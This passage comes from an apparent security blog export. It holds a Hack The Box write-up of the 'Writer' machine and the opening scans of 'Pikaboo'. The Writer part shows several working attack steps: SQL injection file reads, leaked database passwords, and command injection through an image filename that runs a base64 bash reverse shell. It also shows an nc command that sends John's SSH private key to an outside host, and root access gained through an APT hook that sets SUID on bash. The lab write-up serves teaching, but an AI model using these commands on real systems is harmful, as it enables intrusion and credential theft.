password, but it is not crackable with john or hashcat.\nReading files using SQLi If we check for the granted privileges on the database, we see that we are able to read files and write files (privilege called FILE) if we have the right permissions from the file system:\n$ python3 sqli.py privileges {  \u0026#34;grantee\u0026#34;: [  \u0026#34;\u0026#39;admin\u0026#39;@\u0026#39;localhost\u0026#39;\u0026#34;  ],  \u0026#34;privilege_type\u0026#34;: [  \u0026#34;FILE\u0026#34;  ],  \u0026#34;table_catalog\u0026#34;: [  \u0026#34;def\u0026#34;  ],  \u0026#34;is_grantable\u0026#34;: [  \u0026#34;NO\u0026#34;  ] } As a proof of concept, we can read /etc/passwd. This tells us that there are two low-privileged users: kyle and john.\n$ python3 sqli.py /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh john:x:1001:1001:,,,:/home/john:/bin/bash mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false We could continue enumerating files from the server. It would be nice if we could read the source code of the back-end. For that, we can search for the server configuration (usually an Apache or nginx server is running).\nActually, the file /etc/apache2/sites-available/000-default.conf exists, and here it is:\n$ python3 sqli.py /etc/apache2/sites-available/000-default.conf # Virtual host configuration for writer.htb domain \u0026lt;VirtualHost *:80\u0026gt;  ServerName writer.htb  ServerAdmin admin@writer.htb  WSGIScriptAlias / /var/www/writer.htb/writer.wsgi  \u0026lt;Directory /var/www/writer.htb\u0026gt;  Order allow,deny  Allow from all  \u0026lt;/Directory\u0026gt;  Alias /static /var/www/writer.htb/writer/static  \u0026lt;Directory /var/www/writer.htb/writer/static/\u0026gt;  Order allow,deny  Allow from all  \u0026lt;/Directory\u0026gt;  ErrorLog ${APACHE_LOG_DIR}/error.log  LogLevel warn  CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt;  # Virtual host configuration for dev.writer.htb subdomain # Will enable configuration after completing backend development # Listen 8080 #\u0026lt;VirtualHost 127.0.0.1:8080\u0026gt; # ServerName dev.writer.htb # ServerAdmin admin@writer.htb #  # Collect static for the writer2_project/writer_web/templates # Alias /static /var/www/writer2_project/static # \u0026lt;Directory /var/www/writer2_project/static\u0026gt; # Require all granted # \u0026lt;/Directory\u0026gt; # # \u0026lt;Directory /var/www/writer2_project/writerv2\u0026gt; # \u0026lt;Files wsgi.py\u0026gt; # Require all granted # \u0026lt;/Files\u0026gt; # \u0026lt;/Directory\u0026gt; # # WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env # WSGIProcessGroup writer2_project # WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py # ErrorLog ${APACHE_LOG_DIR}/error.log # LogLevel warn # CustomLog ${APACHE_LOG_DIR}/access.log combined # #\u0026lt;/VirtualHost\u0026gt; # vim: syntax=apache ts=4 sw=4 sts=4 sr noet Python source code analysis The previous Apache configuration file points to the main script that the server is running, which is /var/www/writer.htb/writer.wsgi, a common file to configure a Flask application (which is a well-known Python web framework):\n$ python3 sqli.py /var/www/writer.htb/writer.wsgi #!/usr/bin/python  import sys import logging import random import os  # Define logging logging.basicConfig(stream=sys.stderr) sys.path.insert(0,\u0026#34;/var/www/writer.htb/\u0026#34;)  # Import the __init__.py from the app folder from writer import app as application application.secret_key = os.environ.get(\u0026#34;SECRET_KEY\u0026#34;, \u0026#34;\u0026#34;) This Python script is importing another one from writer. Python uses some special filenames for importing modules. Basically, the imported script is at /var/www/writer.htb/writer/__init__.py. This is a really large script containing all the back-end logic (wait for more than 20 minutes to dump the whole file). Some methods of the following code has been stripped because of their length:\n$ python3 sqli.py /var/www/writer.htb/writer/__init__.py from flask import Flask, session, redirect, url_for, request, render_template from mysql.connector import errorcode import mysql.connector import urllib.request import os import PIL from PIL import Image, UnidentifiedImageError import hashlib  app = Flask(__name__,static_url_path=\u0026#39;\u0026#39;,static_folder=\u0026#39;static\u0026#39;,template_folder=\u0026#39;templates\u0026#39;)  #Define connection for database def connections():  try:  connector = mysql.connector.connect(user=\u0026#39;admin\u0026#39;, password=\u0026#39;ToughPasswordToCrack\u0026#39;, host=\u0026#39;127.0.0.1\u0026#39;, database=\u0026#39;writer\u0026#39;)  return connector  except mysql.connector.Error as err:  if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:  return (\u0026#34;Something is wrong with your db user name or password!\u0026#34;)  elif err.errno == errorcode.ER_BAD_DB_ERROR:  return (\u0026#34;Database does not exist\u0026#34;)  else:  return (\u0026#34;Another exception, returning!\u0026#34;)  else:  print (\u0026#39;Connection to DB is ready!\u0026#39;)  #Define homepage @app.route(\u0026#39;/\u0026#39;) def home_page():  try:  connector = connections()  except mysql.connector.Error as err:  return (\u0026#34;Database error\u0026#34;)  cursor = connector.cursor()  sql_command = \u0026#34;SELECT * FROM stories;\u0026#34;  cursor.execute(sql_command)  results = cursor.fetchall()  return render_template(\u0026#39;blog/blog.html\u0026#39;, results=results)  #Define about page @app.route(\u0026#39;/about\u0026#39;) def about():  return render_template(\u0026#39;blog/about.html\u0026#39;)  #Define contact page @app.route(\u0026#39;/contact\u0026#39;) def contact():  return render_template(\u0026#39;blog/contact.html\u0026#39;)  #Define blog posts @app.route(\u0026#39;/blog/post/\u0026lt;id\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def blog_post(id):  try:  connector = connections()  except mysql.connector.Error as err:  return (\u0026#34;Database error\u0026#34;)  cursor = connector.cursor()  cursor.execute(\u0026#34;SELECT * FROM stories WHERE id = %(id)s;\u0026#34;, {\u0026#39;id\u0026#39;: id})  results = cursor.fetchall()  sql_command = \u0026#34;SELECT * FROM stories;\u0026#34;  cursor.execute(sql_command)  stories = cursor.fetchall()  return render_template(\u0026#39;blog/blog-single.html\u0026#39;, results=results, stories=stories)  #Define dashboard for authenticated users @app.route(\u0026#39;/dashboard\u0026#39;) def dashboard():  if not (\u0026#39;user\u0026#39; in session):  return redirect(\u0026#39;/\u0026#39;)  return render_template(\u0026#39;dashboard.html\u0026#39;)  #Define stories page for dashboard and edit/delete pages @app.route(\u0026#39;/dashboard/stories\u0026#39;) def stories():  if not (\u0026#39;user\u0026#39; in session):  return redirect(\u0026#39;/\u0026#39;)  try:  connector = connections()  except mysql.connector.Error as err:  return (\u0026#34;Database error\u0026#34;)  cursor = connector.cursor()  sql_command = \u0026#34;Select * From stories;\u0026#34;  cursor.execute(sql_command)  results = cursor.fetchall()  return render_template(\u0026#39;stories.html\u0026#39;, results=results)  @app.route(\u0026#39;/dashboard/stories/add\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def add_story():  # ...  @app.route(\u0026#39;/dashboard/stories/edit/\u0026lt;id\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def edit_story(id):  # ...  @app.route(\u0026#39;/dashboard/stories/delete/\u0026lt;id\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def delete_story(id):  # ...  #Define user page for dashboard @app.route(\u0026#39;/dashboard/users\u0026#39;) def users():  # ...  #Define settings page @app.route(\u0026#39;/dashboard/settings\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def settings():  # ...  #Define authentication mechanism @app.route(\u0026#39;/administrative\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def login_page():  if (\u0026#39;user\u0026#39; in session):  return redirect(\u0026#39;/dashboard\u0026#39;)  if request.method == \u0026#34;POST\u0026#34;:  username = request.form.get(\u0026#39;uname\u0026#39;)  password = request.form.get(\u0026#39;password\u0026#39;)  password = hashlib.md5(password.encode(\u0026#39;utf-8\u0026#39;)).hexdigest()  try:  connector = connections()  except mysql.connector.Error as err:  return (\u0026#34;Database error\u0026#34;)  try:  cursor = connector.cursor()  sql_command = \u0026#34;Select * From users Where username = \u0026#39;%s\u0026#39; And password = \u0026#39;%s\u0026#39;\u0026#34; % (username, password)  cursor.execute(sql_command)  results = cursor.fetchall()  for result in results:  print(\u0026#34;Got result\u0026#34;)  if result and len(result) != 0:  session[\u0026#39;user\u0026#39;] = username  return render_template(\u0026#39;success.html\u0026#39;, results=results)  else:  error = \u0026#34;Incorrect credentials supplied\u0026#34;  return render_template(\u0026#39;login.html\u0026#39;, error=error)  except:  error = \u0026#34;Incorrect credentials supplied\u0026#34;  return render_template(\u0026#39;login.html\u0026#39;, error=error)  else:  return render_template(\u0026#39;login.html\u0026#39;)  @app.route(\u0026#34;/logout\u0026#34;) def logout():  if not (\u0026#39;user\u0026#39; in session):  return redirect(\u0026#39;/\u0026#39;)  session.pop(\u0026#39;user\u0026#39;)  return redirect(\u0026#39;/\u0026#39;)  if __name__ == \u0026#39;__main__\u0026#39;:  app.run(\u0026#34;0.0.0.0\u0026#34;) This large script contains the following password: ToughPasswordToCrack.\nSMB enumeration At first glance, we have the password to connect to MySQL (ToughPasswordToCrack) as user writer. However, this password is reused for the user kyle in SMB:\n$ smbmap -H 10.10.11.101 -u kyle -p ToughPasswordToCrack [+] IP: 10.10.11.101:445 Name: 10.10.11.101 Status: Authenticated  Disk Permissions Comment  ---- ----------- -------  print$ READ ONLY Printer Drivers  writer2_project READ, WRITE  IPC$ NO ACCESS IPC Service (writer server (Samba, Ubuntu)) As kyle, we can read and write files into writer2_project. Let\u0026rsquo;s download all the files:\n$ smbclient -U kyle //10.10.11.101/writer2_project Enter WORKGROUP\\kyle\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir  . D 0 Mon Aug 2 19:46:12 2021  .. D 0 Tue Jun 22 13:55:06 2021  static D 0 Sun May 16 16:29:16 2021  staticfiles D 0 Fri Jul 9 06:59:42 2021  writer_web D 0 Wed May 19 11:26:18 2021  requirements.txt N 15 Mon Aug 2 19:46:01 2021  writerv2 D 0 Wed May 19 08:32:41 2021  manage.py N 806 Mon Aug 2 19:46:01 2021  7151096 blocks of size 1024. 1985880 blocks available smb: \\\u0026gt; recurse ON smb: \\\u0026gt; prompt OFF smb: \\\u0026gt; mget * ... Once downloaded, we see that this is a Django project (another Python web framework). It seems that the project is not finished, but it is enough to see another MySQL user and password.\nThe password is obtained checking writer2_project/writer2/settings.py for the following fragment of code:\n# Database # https://docs.djangoproject.com/en/1.10/ref/settings/#databases  DATABASES = {  \u0026#39;default\u0026#39;: {  \u0026#39;ENGINE\u0026#39;: \u0026#39;django.db.backends.mysql\u0026#39;,  \u0026#39;OPTIONS\u0026#39;: {  \u0026#39;read_default_file\u0026#39;: \u0026#39;/etc/mysql/my.cnf\u0026#39;  }  } } Then we can check the file /etc/mysql/my.cnf using the SQLi vulnerability:\n$ python sqli.py /etc/mysql/my.cnf # The MariaDB configuration file # # The MariaDB/MySQL tools read configuration files in the following order: # 1. \u0026#34;/etc/mysql/mariadb.cnf\u0026#34; (this file) to set global defaults, # 2. \u0026#34;/etc/mysql/conf.d/*.cnf\u0026#34; to set global options. # 3. \u0026#34;/etc/mysql/mariadb.conf.d/*.cnf\u0026#34; to set MariaDB-only options. # 4. \u0026#34;~/.my.cnf\u0026#34; to set user-specific options. # # If the same option is defined multiple times, the last one will apply. # # One can use all long options that the program supports. # Run program with --help to get a list of available options and with # --print-defaults to see which it would actually understand and use.  # # This group is read both both by the client and the server # use it for options that affect everything # [client-server]  # Import all .cnf files from configuration directory !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/  [client] database = dev user = djangouser password = DjangoSuperPassword default-character-set = utf8 So we have got new credentials for MySQL: djangouser:DjangoSuperPassword.\nFoothold on the machine Inside the administration dashboard, we are able to manage the whole blog (create new stories, edit stories and even delete stories):\nThe form used to upload a new story is the next one:\nThere are two ways to upload an image for the story, one being as a file, and other being as an URL:\nThe difference between the last two screenshots is the story image field, the difference is very subtle.\nTo get access to the machine, we can check __init__.py again. The script is doing something weird when receiving images for new stories of the blog. These are the odd lines of code:\nif request.method == \u0026#34;POST\u0026#34;:  if request.files[\u0026#39;image\u0026#39;]:  image = request.files[\u0026#39;image\u0026#39;]  if \u0026#34;.jpg\u0026#34; in image.filename:  path = os.path.join(\u0026#39;/var/www/writer.htb/writer/static/img/\u0026#39;, image.filename)  image.save(path)  image = \u0026#34;/img/{}\u0026#34;.format(image.filename)  else:  error = \u0026#34;File extensions must be in .jpg!\u0026#34;  return render_template(\u0026#39;add.html\u0026#39;, error=error)  if request.form.get(\u0026#39;image_url\u0026#39;):  image_url = request.form.get(\u0026#39;image_url\u0026#39;)  if \u0026#34;.jpg\u0026#34; in image_url:  try:  local_filename, headers = urllib.request.urlretrieve(image_url)  os.system(\u0026#34;mv {}{}.jpg\u0026#34;.format(local_filename, local_filename))  image = \u0026#34;{}.jpg\u0026#34;.format(local_filename)  try:  im = Image.open(image)  im.verify()  im.close()  image = image.replace(\u0026#39;/tmp/\u0026#39;,\u0026#39;\u0026#39;)  os.system(\u0026#34;mv /tmp/{}/var/www/writer.htb/writer/static/img/{}\u0026#34;.format(image, image))  image = \u0026#34;/img/{}\u0026#34;.format(image)  except PIL.UnidentifiedImageError:  os.system(\u0026#34;rm {}\u0026#34;.format(image))  error = \u0026#34;Not a valid image file!\u0026#34;  return render_template(\u0026#39;add.html\u0026#39;, error=error)  except:  error = \u0026#34;Issue uploading picture\u0026#34;  return render_template(\u0026#39;add.html\u0026#39;, error=error)  else:  error = \u0026#34;File extensions must be in .jpg!\u0026#34;  return render_template(\u0026#39;add.html\u0026#39;, error=error) These lines are present both in /dashboard/stories/add and /dashboard/stories/edit/\u0026lt;id\u0026gt;. As previously said, there are two ways to upload an image. One is directly from the web posting it as a file, and the other one is specifying an URL where the image is located.\nThe documentation for urllib.requests.urlretrieve() says the following:\n retrieve(url, filename=None, reporthook=None, data=None): Retrieves the contents of url and places it in filename. The return value is a tuple consisting of a local filename [\u0026hellip;]. If filename is not given and the URL refers to a local file, the input filename is returned. If the URL is non-local and filename is not given, the filename is the output of tempfile.mktemp() with a suffix that matches the suffix of the last path component of the input URL. [\u0026hellip;].\n This means that if the URL points to a local file, the filename will be exactly the name of that file. But if the file is obtained from outside, then a random name will be chosen.\nThe misconfiguration here is the call to os.system with some odd user input. The idea is to upload a file whose name is something like image.jpg x;shell-command;, in order not to break the mv command, which needs two parameters, and then execute the shell command we want. The resulting command will be:\nmv image.jpg x;shell-command; image.jpg x;shell-command;.jpg The .jpg extension is not a problem because the server only checks that the string \u0026quot;.jpg\u0026quot; is included in the filename:\nimage_url = request.form.get(\u0026#39;image_url\u0026#39;) if \u0026#34;.jpg\u0026#34; in image_url:  # ... Next, we can try to add another image, but this time specifying a local URL (using the file:// schema), so that the file is retrieved from the machine and the filename is not changed. Then the malicious filename will be injected in the os.system call.\nSo let\u0026rsquo;s build a payload and encode it in Base64 just in case:\n$ echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.17.44/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64 YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx Then create a file called fdsa.jpg x;echo \u0026lt;b64\u0026gt;|base64 -d|bash; and upload it as a file.\nThen we can try to upload another image with an URL like file:///var/www/writer.htb/writer/static/img/fdsa.jpg x;echo \u0026lt;b64\u0026gt;|base64 -d|bash;. The use of file:// is the schema required to specify a local file as an URL.\nUsing a nc listener, we gain access to the machine as www-data.\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.101. Ncat: Connection from 10.10.11.101:36806. bash: cannot set terminal process group (1055): Inappropriate ioctl for device bash: no job control in this shell www-data@writer:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@writer:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm www-data@writer:/$ export TERM=xterm www-data@writer:/$ export SHELL=bash www-data@writer:/$ stty rows 50 columns 158 All the foothold process is automated in a Python script called foothold.py (detailed explanation here).\nSystem enumeration We can now recall that we found another user for MySQL (djangouser:DjangoSuperPassword). And actually with this one we can find another hashed password:\nwww-data@writer:/var/www/writer2_project$ mysql -u djangouser -p Enter password: ... MariaDB [dev]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | dev | | information_schema | +--------------------+ 2 rows in set (0.000 sec) MariaDB [dev]\u0026gt; use dev; Database changed MariaDB [dev]\u0026gt; show tables; +----------------------------+ | Tables_in_dev | +----------------------------+ | auth_group | | auth_group_permissions | | auth_permission | | auth_user | | auth_user_groups | | auth_user_user_permissions | | django_admin_log | | django_content_type | | django_migrations | | django_session | +----------------------------+ 10 rows in set (0.001 sec) MariaDB [dev]\u0026gt; describe auth_user; +--------------+--------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +--------------+--------------+------+-----+---------+----------------+ | id | int(11) | NO | PRI | NULL | auto_increment | | password | varchar(128) | NO | | NULL | | | last_login | datetime(6) | YES | | NULL | | | is_superuser | tinyint(1) | NO | | NULL | | | username | varchar(150) | NO | UNI | NULL | | | first_name | varchar(150) | NO | | NULL | | | last_name | varchar(150) | NO | | NULL | | | email | varchar(254) | NO | | NULL | | | is_staff | tinyint(1) | NO | | NULL | | | is_active | tinyint(1) | NO | | NULL | | | date_joined | datetime(6) | NO | | NULL | | +--------------+--------------+------+-----+---------+----------------+ 11 rows in set (0.002 sec) MariaDB [dev]\u0026gt; select username, password from auth_user; +----------+------------------------------------------------------------------------------------------+ | username | password | +----------+------------------------------------------------------------------------------------------+ | kyle | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | +----------+------------------------------------------------------------------------------------------+ 1 row in set (0.001 sec) This time the hash is crackable with hashcat, and returns the password for user kyle (marcoantonio):\n$ hashcat --example-hashes | grep -C 2 pbkdf2_sha256 MODE: 10000 TYPE: Django (PBKDF2-SHA256) HASH: pbkdf2_sha256$10000$1135411628$bFYX62rfJobJ07VwrUMXfuffLfj2RDM2G6/BrTrUWkE= PASS: hashcat $ hashcat -m 10000 hash /usr/share/wordlists/rockyou.txt --quiet pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio Lateral movement to user john Now we can access as kyle via SSH. We have got user.txt:\n$ ssh kyle@10.10.11.101 kyle@10.10.11.101\u0026#39;s password: kyle@writer:~$ cat user.txt 2f1aa903cb62c07380d1d452ef397cf1 We can notice that kyle belongs to the filter group. As a member of that group, we are able to read and write to a shell script called /etc/postfix/disclaimer:\nkyle@writer:~$ id uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup) kyle@writer:~$ find / -group filter 2\u0026gt;/dev/null /etc/postfix/disclaimer /var/spool/filter kyle@writer:~$ find / -group filter 2\u0026gt;/dev/null | xargs ls -la -rwxrwxr-x 1 root filter 1021 Aug 25 23:56 /etc/postfix/disclaimer /var/spool/filter: total 8 drwxr-x--- 2 filter filter 4096 May 13 22:31 . drwxr-xr-x 7 root root 4096 May 18 16:54 .. The script /etc/postfix/disclaimer is the following one:\n#!/bin/sh # Localize these. INSPECT_DIR=/var/spool/filter SENDMAIL=/usr/sbin/sendmail  # Get disclaimer addresses DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses  # Exit codes from \u0026lt;sysexits.h\u0026gt; EX_TEMPFAIL=75 EX_UNAVAILABLE=69  # Clean up when done or when aborting. trap \u0026#34;rm -f in.$$\u0026#34; 0 1 2 3 15  # Start processing. cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit $EX_TEMPFAIL; }  cat \u0026gt;in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }  # obtain From address from_address=`grep -m 1 \u0026#34;From:\u0026#34; in.$$ | cut -d \u0026#34;\u0026lt;\u0026#34; -f 2 | cut -d \u0026#34;\u0026gt;\u0026#34; -f 1`  if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then  /usr/bin/altermime --input=in.$$ \\  --disclaimer=/etc/postfix/disclaimer.txt \\  --disclaimer-html=/etc/postfix/disclaimer.txt \\  --xheader=\u0026#34;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm\u0026#34; || \\  { echo Message content rejected; exit $EX_UNAVAILABLE; } fi  $SENDMAIL \u0026#34;$@\u0026#34; \u0026lt;in.$$  exit $? What the script is doing is append a disclaimer to every email that is sent from root@writer.htb and kyle@writer.htb, as told below:\nkyle@writer:~$ cat /etc/postfix/disclaimer_addresses root@writer.htb kyle@writer.htb kyle@writer:~$ cat /etc/postfix/disclaimer.txt -- This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited. Writer.HTB So we can guess that the script is executed whenever an SMTP email is sent. We can actually modify the script because we are in group filter.\nAfter noticing that john has a .ssh directory, we can simply transfer his private key to our machine using nc 10.10.17.44 4444 \u0026lt; /home/john/.ssh/id_rsa and putting the command on top of the /etc/postfix/disclaimer script.\nTo trigger the execution of the script, we must send an email. For that, we can use a simple Python script like this one (found here):\n#!/usr/bin/python3  import smtplib  sender = \u0026#39;kyle@writer.htb\u0026#39; receivers = [\u0026#39;john@writer.htb\u0026#39;]  message = \u0026#39;\u0026#39;\u0026#39; From: Kyle \u0026lt;kyle@writer.htb\u0026gt; To: John \u0026lt;john@writer.htb\u0026gt; Subject: SMTP e-mail test This is a test e-mail message. \u0026#39;\u0026#39;\u0026#39;[1:]  try:  smtp_object = smtplib.SMTP(\u0026#39;localhost\u0026#39;)  smtp_object.sendmail(sender, receivers, message)  print(\u0026#39;Successfully sent email\u0026#39;) except smtplib.SMTPException:  print(\u0026#39;Error: unable to send email\u0026#39;) And we get the private key so that we have access as john:\n$ nc -nlvp 4444 \u0026gt; id_rsa Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.101. Ncat: Connection from 10.10.11.101:38630. ^C $ chmod 600 id_rsa $ ssh -i id_rsa john@10.10.11.101 john@writer:~$ Privilege escalation If we list processes with ps, we can see a Cron task executed as root that does an apt-get update:\njohn@writer:~$ ps -faux | grep root ... root 31467 0.0 0.0 8356 3400 ? S 19:52 0:00 _ /usr/sbin/CRON -f root 31475 0.0 0.0 2608 608 ? Ss 19:52 0:00 _ /bin/sh -c /usr/bin/apt-get update root 31479 0.1 0.2 16204 8524 ? S 19:52 0:00 _ /usr/bin/apt-get update ... Again, we can check if we belong to any group, and it turns out that we are part of management, whose members are able to write at /etc/apt/apt.conf.d:\njohn@writer:~$ id uid=1001(john) gid=1001(john) groups=1001(john),1003(management) john@writer:~$ find / -group management 2\u0026gt;/dev/null /etc/apt/apt.conf.d john@writer:~$ cd /etc/apt/apt.conf.d john@writer:~$ cat /etc/apt/apt.conf.d/* | grep APT:: APT::Periodic::Update-Package-Lists \u0026#34;1\u0026#34;; APT::Periodic::Download-Upgradeable-Packages \u0026#34;0\u0026#34;; APT::Periodic::AutocleanInterval \u0026#34;0\u0026#34;; APT::Update::Post-Invoke-Success {\u0026#34;touch /var/lib/apt/periodic/update-success-stamp 2\u0026gt;/dev/null || true\u0026#34;;}; APT::Archives::MaxAge \u0026#34;30\u0026#34;; APT::Archives::MinAge \u0026#34;2\u0026#34;; APT::Archives::MaxSize \u0026#34;500\u0026#34;; APT::Update::Post-Invoke-Success { APT::Update::Post-Invoke-Success { APT::Update::Post-Invoke-Success {\u0026#34;/usr/lib/update-notifier/update-motd-updates-available 2\u0026gt;/dev/null || true\u0026#34;;}; After checking the default files at that directory and searching apt-get in GTFObins, we can build a command to be triggered before the apt-get update. For example, let\u0026rsquo;s set SUID permissions to /bin/bash:\njohn@writer:~$ ls -l /bin/bash -rwxr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash john@writer:~$ echo \u0026#39;APT::Update::Pre-Invoke {\u0026#34;chmod 4755 /bin/bash\u0026#34;;};\u0026#39; \u0026gt; /etc/apt/apt.conf.d/01asdf And after around a minute we have:\njohn@writer:~$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash john@writer:~$ bash -p bash-5.0# chmod 0755 /bin/bash bash-5.0# cat /root/root.txt f7e5f21393414b3bb227ee32fdae67a ","image":"/images/HTB/Writer/Writer.png","permalink":"https://7rocky.github.io/en/htb/writer/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine contains a website that is vulnerable to SQL injection. This allows to read the source code of the server and find a vulnerability. Then some command injection techniques to escalate privileges. Some scripting for automating a SQLi exploit, SMB, SMTP and Cron tasks are needed to compromise the machine. This write-up uses custom Python scripts for SQLi and for the foothold","time":18,"title":"Writer"},{"contents":"  OS: Linux   Difficulty: Hard   IP Address: 10.10.10.249   Release: 17 / 07 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.249 -p 21,22,80 Nmap scan report for 10.10.10.249 Host is up (0.045s latency).  PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA) | 256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA) |_ 256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Pikaboo Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.16 seconds This machine has ports 21 (FTP), 22 (SSH) and 80 (HTTP) open.\nWeb enumeration If we enter http://10.10.10.249 in the browser, we will see the following website:\nWe can also have a look at the \u0026ldquo;Pokatdex\u0026rdquo;:\nThere seems to be an administration panel, but we are not allowed to enter since we do not have credentials (when accessing /admin, we are requested for credentials via HTTP Basic Authentication):\nUsing gobuster, we can list some directories on the web server and see something weird:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -r -u http://10.10.10.249 /images (Status: 403) [Size: 274] /admin (Status: 401) [Size: 456] /administration (Status: 401) [Size: 456] /administrator (Status: 401) [Size: 456] /administr8 (Status: 401) [Size: 456] /administrative (Status: 401) [Size: 456] /administratie (Status: 401) [Size: 456] /admins (Status: 401) [Size: 456] /admin_images (Status: 401) [Size: 456] /administrivia (Status: 401) [Size: 456] /administrative-law (Status: 401) [Size: 456] /administrators (Status: 401) [Size: 456] /admin1 (Status: 401) [Size: 456] /administer (Status: 401) [Size: 456] /admin3_gtpointup (Status: 401) [Size: 456] /admin_hp (Status: 401) [Size: 456] /admin25 (Status: 401) [Size: 456] /admin02 (Status: 401) [Size: 456] /administrationinfo (Status: 401) [Size: 456] /admin_thumb (Status: 401) [Size: 456] /admin_full (Status: 401) [Size: 456] /admin_functions (Status: 401) 